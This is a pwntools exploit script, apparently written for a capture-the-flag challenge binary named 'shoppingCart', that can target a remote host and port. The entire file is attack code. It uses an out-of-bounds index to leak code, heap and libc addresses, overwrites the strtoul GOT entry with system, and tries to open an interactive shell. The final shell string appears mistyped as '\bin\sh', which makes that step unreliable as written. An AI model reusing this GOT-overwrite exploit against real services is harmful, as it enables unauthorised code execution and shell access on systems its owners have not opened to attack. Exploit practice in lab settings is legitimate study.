#-*- coding:utf-8 -*-
#/proc/sys/kernel/randomize_va_space
from pwn import *
import sys
import struct
if len(sys.argv)>1:
	debug = False
else:
	debug = True

if debug:
	io = process("./shoppingCart")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./shoppingCart")
else:
	io = remote("202.38.95.46",12008)

codebase = 0x555555554000

def debug():
	gdb.attach(io,"b *{b1}\nb *{b2}".format(b1=hex(codebase+0xE42),b2=hex(codebase+0xBFC)))

def pass1():
	io.sendlineafter("man!\n","1")
	io.sendlineafter("Dollar?\n","aaaa")
	io.sendlineafter("man!\n","3")

#context.terminal = ["tmux", "splitw", "-w"]
context.log_level = "debug"
#debug()
pass1()
io.sendlineafter("buy!\n","1")
io.sendlineafter("name?\n","16")
io.sendlineafter("name?\n","b"*8)

#leak code
offset = 0x0000555555756068 - 0x5555557561e0
#print offset/8
io.sendlineafter("buy!\n","3")
io.sendlineafter("modify?\n",str(offset/8))
io.recvuntil("modify ")
info = io.recvuntil(" to?\n").split(" to?\n")[0].ljust(8,"\x00")
leak_code = u64(info)
offset1 = 0x555555756068 - 0x555555554000
code_base = leak_code - offset1
log.success("code_base:"+hex(code_base))
heap_addr = code_base + 0x00000000002021E0
io.send(p64(heap_addr))

#leak heap
io.sendlineafter("buy!\n","3")
io.sendlineafter("modify?\n",str(offset/8))
io.recvuntil("modify ")
info = io.recvuntil(" to?\n").split(" to?\n")[0].ljust(8,"\x00")
leak_heap = u64(info)
#print hex(leak_heap)
offset2 = 0x555555758470 - 0x555555757000
heap_base = leak_heap - offset2
log.success("heap_base:"+hex(heap_base))
stroul_got = elf.got["strtoul"]
#print hex(stroul_got)
io.send(p64(code_base+stroul_got))

#leak heap
io.sendlineafter("buy!\n","3")
io.sendlineafter("modify?\n","0")
io.recvuntil("modify ")
info = io.recvuntil(" to?\n").split(" to?\n")[0].ljust(8,"\x00")
leak_libc = u64(info)
print hex(leak_libc)
libc.address = leak_libc - libc.symbols["strtoul"]
log.success("libc_base:"+hex(libc.address))
system_addr = libc.symbols["system"]
io.sendline(p64(system_addr))

io.sendlineafter("buy!\n","\bin\sh")

io.interactive()
